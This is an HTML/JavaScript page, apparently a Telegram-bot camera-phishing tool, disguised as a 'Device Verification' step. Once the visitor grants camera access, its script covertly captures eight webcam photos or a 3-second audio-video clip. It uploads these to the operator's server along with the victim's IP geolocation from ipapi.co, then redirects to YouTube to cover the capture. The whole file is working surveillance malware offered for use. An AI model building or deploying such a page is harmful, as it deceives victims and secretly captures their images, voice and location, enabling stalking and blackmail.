<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #0088cc; border: none; padding: 15px 30px; color: white; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
        #loader { display: none; margin-top: 20px; }
        .bar-bg { width: 80%; background: #333; height: 12px; margin: 20px auto; border-radius: 6px; overflow: hidden; }
        #bar { width: 0%; background: #0088cc; height: 100%; transition: 0.4s; }
    </style>
</head>
<body>
    <div id="setup">
        <h2>🔒 Device Verification</h2>
        <p>Please allow camera access to verify your identity.</p>
        <button class="btn" onclick="start()">Verify Now</button>
    </div>

    <div id="loader">
        <h3 id="msg">Initialising...</h3>
        <div class="bar-bg"><div id="bar"></div></div>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id'); 
        const mode = params.get('mode') || 'photo';

        async function start() {
            if (!uid || uid === "YOUR_TELEGRAM_ID" || uid === "null") {
                alert("Error: Invalid Link. Please open the link sent by the bot.");
                return;
            }

            document.getElementById('setup').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: (mode === 'video') 
                });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Log Info
                fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                    fetch(`/log_info?id=${uid}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                });

                if (mode === 'video') { record(stream); } else { snap(); }
            } catch (e) { alert("Camera required for verification."); }
        }

        function snap() {
            let count = 0;
            const timer = setInterval(() => {
                if (count >= 8) { clearInterval(timer); done(); return; }
                const c = document.getElementById('c');
                const v = document.getElementById('v');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob);
                    fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                count++;
                document.getElementById('bar').style.width = (count * 12.5) + "%";
                document.getElementById('msg').innerText = `Verifying... ${count}/8`;
            }, 600);
        }

        function record(stream) {
            const rec = new MediaRecorder(stream);
            const chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('file', blob);
                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
                done();
            };
            rec.start();
            document.getElementById('msg').innerText = "Recording Video (3s)...";
            setTimeout(() => { rec.stop(); document.getElementById('bar').style.width = "100%"; }, 3000);
        }

        function done() {
            document.getElementById('msg').innerText = "Success! Redirecting...";
            setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 1500);
        }
    </script>
</body>
</html>
